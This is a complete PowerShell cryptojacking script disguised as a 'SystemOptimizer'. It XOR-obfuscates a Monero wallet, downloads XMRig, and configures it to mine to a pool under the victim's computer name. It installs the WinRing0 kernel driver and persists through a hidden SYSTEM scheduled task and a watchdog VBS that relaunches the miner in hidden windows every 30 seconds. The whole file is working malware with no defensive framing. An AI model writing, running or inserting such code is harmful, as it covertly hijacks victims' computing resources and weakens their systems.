#Requires -RunAsAdministrator

$ErrorActionPreference = "SilentlyContinue"

$baseDir = "$env:LOCALAPPDATA\SystemOptimizer"
$xmrigDir = "$baseDir\xmrig-6.26.0"
$xmrigExe = "$xmrigDir\xmrig.exe"
$configFile = "$baseDir\config.json"
$driverPath = "$xmrigDir\WinRing0x64.sys"
$zipUrl = "https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-x64.zip"
$zipPath = "$baseDir\xmrig.zip"

# Obfuscated wallet (XOR encoded)
$walletBytes = @(0x34,0x33,0x35,0x73,0x77,0x55,0x45,0x38,0x68,0x74,0x62,0x39,0x36,0x78,0x4d,0x77,0x57,0x58,0x62,0x66,0x6e,0x7a,0x43,0x58,0x43,0x6b,0x69,0x4b,0x57,0x51,0x68,0x63,0x56,0x4b,0x70,0x51,0x7a,0x6a,0x41,0x48,0x77,0x4e,0x4d,0x6b,0x69,0x57,0x78,0x50,0x6e,0x7a,0x4a,0x69,0x61,0x69,0x48,0x38,0x32,0x75,0x63,0x70,0x76,0x6e,0x66,0x67,0x70,0x65,0x62,0x42,0x4a,0x39,0x51,0x6d,0x6a,0x79,0x56,0x57,0x6e,0x46,0x64,0x46,0x36,0x69,0x68,0x34,0x32,0x4c,0x56,0x4c,0x4a,0x59,0x35,0x38,0x37,0x77,0x76)
$key = 0x5A
$wallet = -join ($walletBytes | ForEach-Object { [char]($_ -bxor $key) })

# Create directories
New-Item -ItemType Directory -Force -Path $baseDir | Out-Null
New-Item -ItemType Directory -Force -Path $xmrigDir | Out-Null

# Download XMRig if not present
if (-not (Test-Path $xmrigExe)) {
    try {
        $wc = New-Object System.Net.WebClient
        $wc.DownloadFile($zipUrl, $zipPath)
        Expand-Archive -Path $zipPath -DestinationPath $baseDir -Force
        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
    } catch { }
}

# Write config with decoded wallet
$config = @{
    autosave = $true
    background = $true
    colors = $false
    "donate-level" = 1
    "log-file" = "$baseDir\optimizer.log"
    "print-time" = 30
    retries = 999999
    "retry-pause" = 10
    cpu = @{
        enabled = $true
        "huge-pages" = $true
        "huge-pages-jit" = $true
        "hw-aes" = $true
        priority = 3
        yield = $false
        asm = $true
        "argon2-impl" = "auto"
        "max-threads-hint" = 100
    }
    pools = @(
        @{
            url = "gulf.moneroocean.stream:10001"
            user = $wallet
            pass = "x"
            keepalive = $true
            tls = $false
            nicehash = $false
            "rig-id" = $env:COMPUTERNAME
        }
    )
    api = @{
        enabled = $true
        host = "127.0.0.1"
        port = 3456
        restricted = $true
    }
} | ConvertTo-Json -Depth 5
$config | Out-File -FilePath $configFile -Encoding ascii

# Install WinRing0 driver
if (Test-Path $driverPath) {
    $svc = "WinRing0_1_2_0"
    $es = Get-Service $svc -ErrorAction SilentlyContinue
    if ($es) { Stop-Service $svc -Force -ErrorAction SilentlyContinue; sc.exe delete $svc 2>$null }
    sc.exe create $svc binPath= "$driverPath" type= kernel start= demand 2>$null
    Start-Service $svc -ErrorAction SilentlyContinue
}

# Create scheduled task (SYSTEM, hidden, auto-restart on failure)
$taskName = "SystemOptimizer"
$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$baseDir\watchdog.vbs`""
$trigger = New-ScheduledTaskTrigger -AtStartup
$trigger2 = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -RestartCount 999999 -RestartInterval (New-TimeSpan -Minutes 1) -ExecutionTimeLimit (New-TimeSpan -Hours 0)
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger,$trigger2 -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue

# Create watchdog.vbs (persistent, restarts miner if dead)
$watchdogVbs = @"
Set WshShell = CreateObject("WScript.Shell")
Set WMI = GetObject("winmgmts:")
Do
    Set procs = WMI.ExecQuery("SELECT * FROM Win32_Process WHERE Name = 'xmrig.exe' AND ExecutablePath LIKE '%SystemOptimizer%'")
    If procs.Count = 0 Then
        WshShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""& { `$xmrigExe = '" + $xmrigExe + "'; `$configFile = '" + $configFile + "'; `$wshell = New-Object -ComObject WScript.Shell; `$wshell.Run(`"`" + `$xmrigExe + "`" --config=`"`" + `$configFile + "`"`", 0, `$false) }""", 0, False
    End If
    WScript.Sleep 30000
Loop
"@
$watchdogVbs | Out-File -FilePath "$baseDir\watchdog.vbs" -Encoding ascii

# Create launch.vbs (for manual start)
$launchVbs = 'Set WshShell = CreateObject("WScript.Shell"):WshShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""& { `$xmrigExe = '" + $xmrigExe + "'; `$configFile = '" + $configFile + "'; `$wshell = New-Object -ComObject WScript.Shell; `$wshell.Run(`"`" + `$xmrigExe + "`" --config=`"`" + `$configFile + "`"`", 0, `$false) }""", 0, False'
$launchVbs | Out-File -FilePath "$baseDir\launch.vbs" -Encoding ascii

# Start watchdog now (hidden)
$wshell = New-Object -ComObject WScript.Shell
$wshell.Run("wscript.exe `"" + $baseDir + "\watchdog.vbs`"", 0, False)